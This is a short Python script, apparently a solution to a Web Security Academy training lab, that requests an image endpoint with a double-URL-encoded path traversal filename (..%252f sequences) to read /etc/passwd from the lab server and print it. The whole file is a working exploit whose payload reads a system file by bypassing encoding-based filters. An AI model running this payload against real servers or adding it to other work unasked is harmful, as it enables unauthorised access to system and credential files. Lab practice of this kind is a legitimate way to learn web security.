import requests

site = "0af8003603d7ed83806b26c300b10038.web-security-academy.net"
url = f"https://{site}/image?filename=..%252f..%252f..%252fetc%252fpasswd"
s = requests.Session()
resp = s.get(url)
print(resp.text)
